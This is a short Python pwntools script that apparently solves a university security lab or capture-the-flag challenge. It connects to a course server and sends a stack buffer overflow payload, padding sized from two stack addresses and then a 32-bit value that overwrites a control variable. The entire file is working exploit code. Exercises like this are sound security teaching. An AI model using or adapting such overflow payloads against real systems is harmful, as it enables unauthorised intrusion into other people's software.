#!/bin/python3.11
from pwn import *

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9991)

valueToMatch = 0x61626364

control = 0xffffce2c

buffer = 0xffffcdec

offset = control - buffer

payload = b"A" * offset + p32(valueToMatch)

print(S.recvuntil("364\n"))
S.sendline(payload)
print(S.recvall())
